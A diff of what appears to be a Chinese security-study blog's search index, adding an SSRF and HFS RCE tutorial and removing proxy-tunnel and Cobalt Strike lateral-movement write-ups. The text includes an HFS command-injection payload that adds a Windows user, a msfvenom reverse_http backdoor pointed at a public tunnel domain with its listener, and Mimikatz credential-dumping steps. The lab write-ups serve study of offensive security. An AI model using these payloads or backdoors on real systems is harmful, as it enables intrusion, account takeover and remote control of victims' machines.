@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>WEB靶场系列[sqli-labs]</title>
+    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bsqli-labs%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>WEB靶场</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Metasploit系列-[Kali基础]</title>
     <url>/2022/05/01/Kali%E6%B8%97%E9%80%8F/Metasploit%E7%B3%BB%E5%88%97-%5BKali%E5%9F%BA%E7%A1%80%5D%20/</url>
     <content><![CDATA[]]></content>
@@ -9,8 +17,8 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB安全系列-[信息收集]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
+    <title>WEB安全系列-[XSS跨站]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>WEB安全</category>
@@ -493,27 +501,11 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB安全系列-[XSS跨站]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
+    <title>WEB安全系列-[信息收集]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WEB靶场系列[upload-labs]</title>
-    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bupload-labs%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>WEB靶场</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WEB靶场系列[sqli-labs]</title>
-    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bsqli-labs%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>WEB靶场</category>
       </categories>
   </entry>
   <entry>
@@ -526,14 +518,6 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB实战系列-[手工获取外网网站登录名和密码]</title>
-    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>实战系列</category>
-      </categories>
-  </entry>
-  <entry>
     <title>内网安全系列-[ARP欺骗]</title>
     <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
     <content><![CDATA[<p>22222收入的分第三方</p>
@@ -543,12 +527,11 @@
       </categories>
   </entry>
   <entry>
-    <title>内网安全系列-[IPC$入侵]</title>
-    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
-    <content><![CDATA[<p>22222收入的分第三方</p>
-]]></content>
+    <title>WEB靶场系列[upload-labs]</title>
+    <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bupload-labs%5D/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>内网安全</category>
+        <category>WEB靶场</category>
       </categories>
   </entry>
   <entry>
@@ -560,30 +543,20 @@
       </categories>
   </entry>
   <entry>
-    <title>Kali汉化中文-[技巧系列]</title>
-    <url>/2022/05/11/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Kali%E6%B1%89%E5%8C%96%E4%B8%AD%E6%96%87-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
-    <content><![CDATA[<ol>
-<li><p>打开终端输入：sudo dpkg-reconfigure locales</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo dpkg-reconfigure locales<br></code></pre></td></tr></table></figure></li>
-</ol>
-<p><img src="/../../images/jq/1652284493685.png" alt="1652284493685"></p>
-<p><img src="/../../images/jq/1652284674948.png" alt="1652284674948"></p>
-<p><img src="/../../images/jq/1652284702962.png" alt="1652284702962"></p>
-<p>汉化完成</p>
-<p><img src="/../../images/jq/1652284751075.png" alt="1652284751075"></p>
-]]></content>
+    <title>WEB实战系列-[手工获取外网网站登录名和密码]</title>
+    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
+    <content><![CDATA[]]></content>
       <categories>
-        <category>技巧系列</category>
+        <category>实战系列</category>
       </categories>
   </entry>
   <entry>
-    <title>Linux命令下载文件-[技巧系列]</title>
-    <url>/2022/05/12/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Linux%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
-    <content><![CDATA[<p>wget+文件下载链接</p>
-<p><img src="/../../images/jq/1652290754674.png" alt="1652290754674"></p>
+    <title>内网安全系列-[IPC$入侵]</title>
+    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
+    <content><![CDATA[<p>22222收入的分第三方</p>
 ]]></content>
       <categories>
-        <category>技巧系列</category>
+        <category>内网安全</category>
       </categories>
   </entry>
   <entry>
@@ -697,6 +670,46 @@
 <p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652916626866.png" alt="1652916626866"></p>
 <p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BRCE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%5D.assets/1652916871142.png" alt="1652916871142"></p>
 <h4><span id="2dnslog">2.Dnslog</span></h4>]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[SSRF]</title>
+    <url>/2022/05/14/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D/</url>
+    <content><![CDATA[<h1><span id="ssrf概述"><strong>SSRF概述</strong></span></h1><blockquote>
+<p>SSRF(Server-SideRequest Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
+</blockquote>
+<blockquote>
+<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+</blockquote>
+<p> <strong>SSRF(Server-Side Request Forgery)，服务器端请求伪造；利用一个可以发起网络请求的服务，可以当做跳板来攻击其他服务。</strong> </p>
+<p><img src="/../../images/ssrf/1653216338696.png" alt="1653216338696"></p>
+<h1><span id="案例一通过web服务器充当代理访问内网">案例一：通过WEB服务器充当代理访问内网</span></h1><p>分析：例如我要远程上传图片地址，例如地址是<a href="https://img0.baidu.com/a.jpg%EF%BC%8C%E9%82%A3%E4%B9%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%82%AF%E5%AE%9A%E8%A6%81%E5%8E%BB%E8%AF%B7%E6%B1%82%E8%A6%81%E5%8E%BB%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8D%E7%BB%8F%E8%BF%87%E8%AF%B7%E6%B1%82%E6%98%AF%E6%8B%BF%E4%B8%8D%E5%88%B0%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%E7%9A%84">https://img0.baidu.com/a.jpg，那么服务器肯定要去请求要去访问，不经过请求是拿不到这个图片的</a></p>
+<p>既然服务器会去请求地，那么我们输入<a href="http://127.0.0.1呢？">http://127.0.0.1呢？</a></p>
+<p><strong>我本地搭建的环境默认端口80就是sql靶场</strong></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215503654.png" alt="1653215503654"></p>
+<p>探测端口功能</p>
+<p>3306 是mysql数据库端口</p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215774197.png" alt="1653215774197"></p>
+<p>探针本地file协议</p>
+<p>file:&#x2F;&#x2F;&#x2F;D:<a href="http://www.txt/">www.txt</a></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216503828.png" alt="1653216503828"></p>
+<p>探针Ftp协议</p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216682123.png" alt="1653216682123"></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216672490.png" alt="1653216672490"></p>
+<h1><span id="hfs的远程命令执行漏洞rce">HFS的远程命令执行漏洞（RCE）</span></h1><p><strong>一、HFS漏洞</strong></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559115584.png" alt="1653559115584"></p>
+<p>1、影响版本 : 2.3c以前的2.3x版本</p>
+<p>2、HFS：HFS是HTTP File Server，国外的一款HTTP 文件服务器软件，简单易上手。3、漏洞描述：HTTP File Server是一款专为个人用户所设计的HTTP文件服务器，它提供虚拟档案系统，支持新增、移除虚拟档案资料夹等。</p>
+<p>下载：<a href="http://www.winwin7.com/soft/12112.html#xiazai">HFS2.3下载</a></p>
+<p>4、攻击payload及过程：</p>
+<p>4.1 Payload：<a href="http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}</p>
+<p>4.2攻击过程实例：</p>
+<p><a href="http://127.0.0.1:81/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:81/?search==%00{.exec|cmd.exe</a> &#x2F;c net user test1234 1234 &#x2F;add.}</p>
+<p>在本地执行</p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559370177.png" alt="1653559370177"></p>
+]]></content>
       <categories>
         <category>小迪安全</category>
       </categories>
@@ -1208,177 +1221,6 @@
       </categories>
   </entry>
   <entry>
-    <title>小迪安全系列-[SSRF]</title>
-    <url>/2022/05/14/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D/</url>
-    <content><![CDATA[<h1><span id="ssrf概述"><strong>SSRF概述</strong></span></h1><blockquote>
-<p>SSRF(Server-SideRequest Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
-</blockquote>
-<blockquote>
-<p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
-</blockquote>
-<p> <strong>SSRF(Server-Side Request Forgery)，服务器端请求伪造；利用一个可以发起网络请求的服务，可以当做跳板来攻击其他服务。</strong> </p>
-<p><img src="/../../images/ssrf/1653216338696.png" alt="1653216338696"></p>
-<h1><span id="案例一通过web服务器充当代理访问内网">案例一：通过WEB服务器充当代理访问内网</span></h1><p>分析：例如我要远程上传图片地址，例如地址是<a href="https://img0.baidu.com/a.jpg%EF%BC%8C%E9%82%A3%E4%B9%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%82%AF%E5%AE%9A%E8%A6%81%E5%8E%BB%E8%AF%B7%E6%B1%82%E8%A6%81%E5%8E%BB%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%B8%8D%E7%BB%8F%E8%BF%87%E8%AF%B7%E6%B1%82%E6%98%AF%E6%8B%BF%E4%B8%8D%E5%88%B0%E8%BF%99%E4%B8%AA%E5%9B%BE%E7%89%87%E7%9A%84">https://img0.baidu.com/a.jpg，那么服务器肯定要去请求要去访问，不经过请求是拿不到这个图片的</a></p>
-<p>既然服务器会去请求地，那么我们输入<a href="http://127.0.0.1呢？">http://127.0.0.1呢？</a></p>
-<p><strong>我本地搭建的环境默认端口80就是sql靶场</strong></p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215503654.png" alt="1653215503654"></p>
-<p>探测端口功能</p>
-<p>3306 是mysql数据库端口</p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653215774197.png" alt="1653215774197"></p>
-<p>探针本地file协议</p>
-<p>file:&#x2F;&#x2F;&#x2F;D:<a href="http://www.txt/">www.txt</a></p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216503828.png" alt="1653216503828"></p>
-<p>探针Ftp协议</p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216682123.png" alt="1653216682123"></p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653216672490.png" alt="1653216672490"></p>
-<h1><span id="hfs的远程命令执行漏洞rce">HFS的远程命令执行漏洞（RCE）</span></h1><p><strong>一、HFS漏洞</strong></p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559115584.png" alt="1653559115584"></p>
-<p>1、影响版本 : 2.3c以前的2.3x版本</p>
-<p>2、HFS：HFS是HTTP File Server，国外的一款HTTP 文件服务器软件，简单易上手。3、漏洞描述：HTTP File Server是一款专为个人用户所设计的HTTP文件服务器，它提供虚拟档案系统，支持新增、移除虚拟档案资料夹等。</p>
-<p>下载：<a href="http://www.winwin7.com/soft/12112.html#xiazai">HFS2.3下载</a></p>
-<p>4、攻击payload及过程：</p>
-<p>4.1 Payload：<a href="http://127.0.0.1:8080/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:8080/?search==%00{.exec|cmd.exe</a> &#x2F;c [Command-String].}</p>
-<p>4.2攻击过程实例：</p>
-<p><a href="http://127.0.0.1:81/?search==%00%7B.exec%7Ccmd.exe">http://127.0.0.1:81/?search==%00{.exec|cmd.exe</a> &#x2F;c net user test1234 1234 &#x2F;add.}</p>
-<p>在本地执行</p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSSRF%5D.assets/1653559370177.png" alt="1653559370177"></p>
-]]></content>
-      <categories>
-        <category>小迪安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小迪安全系列-[代理技术]</title>
-    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D/</url>
-    <content><![CDATA[<p><img src="/../../images/xdnwaq/1651925898412.png" alt="1651925898412"></p>
-<blockquote>
-<p>代理技术和隧道技术都属于内网穿透，代理主要解决内网里面通信的问题（比如对方在内网，你也在内网，这时候两个内网实现通信就必须要经过代理才能实现，常见工具有frp、ngrok和ew等，ew（earthworm已经停止更新了，就不演示）），和一些防火墙的拦截<br>隧道主要是一些安全设备和流量监控设备上的拦截问题</p>
-</blockquote>
-<h2><span id="必要基础知识点">必要基础知识点：</span></h2><h2><span id="1内外网简单知识">1.内外网简单知识</span></h2><blockquote>
-<p><strong>内网ip地址是私有ip地址（<em>10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16</em>），除此之外就是公有ip</strong></p>
-</blockquote>
-<h2><span id="2内网1和内网2通信问题">2.内网1和内网2通信问题</span></h2><blockquote>
-<p><strong>1主机在内网1,2主机在内网2.就好比说你在学校宿舍上网，我在网吧上网，我们都属于内网，但是我们不是一个内网，您是学校内网，我是网吧内网，这两个网络如果要实现通信。比如我现在有个后门CS或者MSF生成一个后门发给你，你去执行这个后门，这个时候如果你能让对方上线到你这是上线不了的，因为你们都是内网，除非这个时候采用一些代理技术。你用CS想控制这台内网主机，你CS在另外一个内网，受害主机在一个内网，那么上线是不可能的。必须要借助代理</strong></p>
-</blockquote>
-<h2><span id="3正反向协议通信连接问题">3.正反向协议通信连接问题</span></h2><blockquote>
-<p><strong>正向代理就是正方向的连接，反向代理就是反方向的连接</strong><br><strong>什么是正方向，什么是反方向呢？</strong><br><strong>如果是控制端去连接被控制端的话，就属于正向代理，</strong><br><strong>被控制端去连接控制端就是反向代理。</strong></p>
-<p><strong>这个正向代理和反向代理为什么要区分开呢？</strong><br><strong>你的控制端如果是服务器，是外网一台主机，就是公网的一台服务器，就相当于你在外网有一个唯一的IP地址，通过这个IP地址你能够找到你；</strong><br><strong>被控制的肉鸡是内网，如果你去主动找这台被控的内网主机你是找不到的，</strong></p>
-</blockquote>
-<p><img src="/../../images/xdnwaq/1651926501330.png" alt="1651926501330"></p>
-<h2><span id="4内网穿透代理隧道技术说明">4.内网穿透代理隧道技术说明</span></h2><blockquote>
-<p><strong>隧道主要解决流量分析工具和流量监控工具 还有想防火墙过滤问题</strong><br><strong>代理主要解决网络的连通性问题</strong></p>
-</blockquote>
-<p><img src="/../../images/xdnwaq/1651926587727.png" alt="1651926587727"></p>
-<blockquote>
-<p>黑客在湖南局域网，肉鸡在上海局域网，你用的是自己内网里面的虚拟机kali生成的后门，你想实现控制上海的肉鸡。<br>理论上，如果你不涉及到代理，是绝对控制不了的，因为你两者都是内网，你生成后门的时候，你如果写你外网的木马地址的话，它去连接的时候找到的是你的路由器，你写你内网地址的话，那就更加找不到，它就不可能实现控制。</p>
-</blockquote>
-<blockquote>
-<p><strong>这时候就要借助ngrok这款工具来实现连通，它是怎么实现呢？下面简单把原理分析一下</strong></p>
-<p>​        用到ngrok这款工具的时候，ngrok会在外网启动一台服务器给你，相当于这台肉鸡想去找你的时候先去找这个服务器，服务器再传输给你。同样，如果你要找这台肉鸡，也要经过这台服务器，其实就是说，这款工具就是在中间架设一台外网服务器，因为这台外网服务器你和他都能访问，你找对面肉鸡的时候会经过外网服务器，这个数据要回连给控制端的时候也会找这台外网服务器，服务器会在控制端这里有个客户端，就相当于接收服务器给的数据，你出去，客户端给服务器；数据连通就是正常的！其实就是找了一个中介！</p>
-</blockquote>
-<h1><span id="演示案例">演示案例</span></h1><h2><span id="内网穿透ngrok测试演示-两个内网通讯上线">内网穿透Ngrok测试演示-两个内网通讯上线</span></h2><p> <strong>实验环境：</strong>两个不同的内网(有网络)实现穿透控制<br><strong>1.注册-购买-填写-确认<a href="http://www.ngrok.cc/%EF%BC%88%E5%9B%BD%E5%86%85%EF%BC%89">http://www.ngrok.cc/（国内）</a></strong><br>协议：http 本地端口：192.168.76.132:4444 </p>
-<h3><span id="开通隧道">开通隧道</span></h3><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D.assets/1651927061288.png" alt="1651927061288"></p>
-<p><img src="/../../images/xdnwaq/1651927275953.png" alt="1651927275953"></p>
-<h3><span id="kali搭建隧道">Kali搭建隧道</span></h3><p> <strong>192.168.176.137:4444就是本机kali的ip地址</strong> </p>
-<p>Kali搭建sunny环境</p>
-<p><img src="/../../images/xdnwaq/1640708930372.png" alt="1640708930372"></p>
-<p><img src="/../../images/xdnwaq/1640709074892.png" alt="1640709074892"></p>
-<h3><span id="kali生成后门">Kali生成后门</span></h3><p>lhost主机地址是隧道地址，也就是说肉鸡执行木马之后会找到公网上的隧道地址</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_http lhost=junzi.free.idcfengye.com【购买隧道的域名】 lport=80 -f exe -o test.exe  <br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/1651985725753.png" alt="1651985725753"></p>
-<h3><span id="msf配置后门监听状态">MSF配置后门监听状态</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_http<br>set lhost 192.168.76.132<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/1640710640214.png" alt="1640710640214"></p>
-<h3><span id="肉鸡上线">肉鸡上线</span></h3><p>win7运行后门后，成功监听到</p>
-<p><img src="/../../images/xdnwaq/1640712114675.png" alt="1640712114675"></p>
-<h3><span id="原理刨析">原理刨析</span></h3><p>Kali和win7是在不同的局域网中，但是都能上网，普通的msf后门肯定是 不能让 win7上线成功的，但是借助一个外网服务器充当代理，那么就可以实现控制win7的目的</p>
-<p><img src="/../../images/xdnwaq/1640712970874.png" alt="1640712970874"></p>
-<h2><span id="案例2-内网穿透frp自建跳板测试-两个内网通讯上线">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</span></h2><p><a href="https://github.com/fatedier/frp/releases">Frp Github下载</a></p>
-<p> <strong>优点：自行搭建，方便修改，成本低，使用多样化</strong></p>
-]]></content>
-      <categories>
-        <category>小迪安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>小迪安全系列-[内网渗透进阶]</title>
-    <url>/2022/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D/</url>
-    <content><![CDATA[<p>[TOC]</p>
-<h1><span id="一域横向-cobaltstrikeampspnamprdp">一,域横向 CobaltStrike&amp;SPN&amp;RDP</span></h1><h2><span id="域横向移动测试流程一把梭-cs初体验">域横向移动测试流程一把梭-CS初体验</span></h2><p> 下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66 </p>
-<blockquote>
-<p><strong>客户端：win10（自己的主机）</strong></p>
-<p><strong>服务端： Kali</strong></p>
-</blockquote>
-<p>安装java环境<br>客户端windows的java环境配置可以看我前面的文章，这里就不再赘述，下面介绍服务端的配置</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入根目录</span><br>cd /<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java是否安装</span><br>java -version<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装java</span><br>apt install openjdk-14-jre-headless<br><br></code></pre></td></tr></table></figure>
-
-
-
-<p> 检查是否安装成功,返回面的内容，说明已经成功了 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">root@vultr:/# java -version<br>openjdk version &quot;14.0.2&quot; 2020-07-14<br>OpenJDK Runtime Environment (build 14.0.2+12-Ubuntu-120.04)<br>OpenJDK 64-Bit Server VM (build 14.0.2+12-Ubuntu-120.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure>
-
-
-
-<p> 环境变量 </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java的安装路径，这里提示我们在链接组java（提供/usr/bin/java）中只有一种选择，所以无需配置环境变量</span><br>root@vultr:/# update-alternatives --config java<br>There is only one alternative in link group java (providing /usr/bin/java): /usr/lib/jvm/java-14-openjdk-amd64/bin/java<br>Nothing to configure.<br><br></code></pre></td></tr></table></figure>
-
-
-
-
-
-<h2><span id="启动服务端">启动服务端</span></h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/1651669739393.png" alt="1651669739393"></p>
-<h2><span id="客户端连接">客户端连接</span></h2><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
-<p><strong>连接成功，服务端搭建完毕</strong></p>
-<p><img src="/../../images/xdnwaq/1640500886850.png" alt="1640500886850"></p>
-<h1><span id="cobaltstrike利用">CobaltStrike利用</span></h1><h3><span id="翻译">翻译</span></h3><p><img src="/../../images/xdnwaq/1651757827302.png" alt="1651757827302"></p>
-<p><img src="/../../images/xdnwaq/1651757843156.png" alt="1651757843156"></p>
-<h2><span id="主机上线">主机上线</span></h2><h3><span id="配置监听器">配置监听器</span></h3><p><img src="/../../images/xdnwaq/165168350233655.png" alt="1651683502336"></p>
-<p><img src="/../../images/xdnwaq/164050146705546.png" alt="1640501467046"></p>
-<p><img src="/../../images/xdnwaq/1651684006980.png" alt="1651684006980"></p>
-<h3><span id="配置后门木马">配置后门木马</span></h3><p><img src="/../../images/xdnwaq/1651683848651.png" alt="1651683848651"></p>
-<h3><span id="生成木马">生成木马</span></h3><p><img src="/../../images/xdnwaq/1651684126849.png" alt="1651684126849"></p>
-<h3><span id="主机上线成功">主机上线成功</span></h3><p><strong><img src="/../../images/xdnwaq/1651684932069.png" alt="1651684932069"></strong></p>
-<h2><span id="提权">提权</span></h2><h3><span id="提权插件">提权插件</span></h3><p>上传插件后，单机UnIoad</p>
-<p><img src="/../../images/xdnwaq/1651706907877.png" alt="1651706907877"></p>
-<h3><span id="提权配置">提权配置</span></h3><p><img src="/../../images/xdnwaq/16517072374002.png" alt="1651707237002"></p>
-<h3><span id="提权成功">提权成功</span></h3><p><img src="/../../images/xdnwaq/1651707405682.png" alt="1651707405682"></p>
-<h2><span id="信息收集命令">信息收集命令</span></h2><h3><span id="getuid查看系统权限">getuid查看系统权限</span></h3><p><img src="/../../images/xdnwaq/1651707774341.png" alt="1651707774341"></p>
-<h2><span id="net-view查看网络拓扑">net view查看网络拓扑</span></h2><p><img src="/../../images/xdnwaq/1651707917280.png" alt="1651707917280"></p>
-<p>当我们信息收集太多时，会显得很杂乱，通过Targets菜单获取所有探针过的主机</p>
-<p><img src="/../../images/xdnwaq/1651708048992.png" alt="1651708048992"></p>
-<h3><span id="执行minikatz">执行MInikatz</span></h3><p><img src="/../../images/xdnwaq/1651756948323.png" alt="1651756948323"></p>
-<h3><span id="转存hash">转存Hash</span></h3><p><img src="/../../images/xdnwaq/1651756812807.png" alt="1651756812807"></p>
-<ul>
-<li><h3><span id="执行cmd命令">执行CMD命令</span></h3></li>
-</ul>
-<p>Cobalt Strike 默认提供自带命令</p>
-<p><img src="/../../images/xdnwaq/1651757061320.png" alt="1651757061320"></p>
-<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D.assets/1651757100401.png" alt="1651757100401"></p>
-<h3><span id="调用cmd">调用CMD</span></h3><p>如果要调用CMD命令的需要在输入框前面加一个**<code>shell</code>**</p>
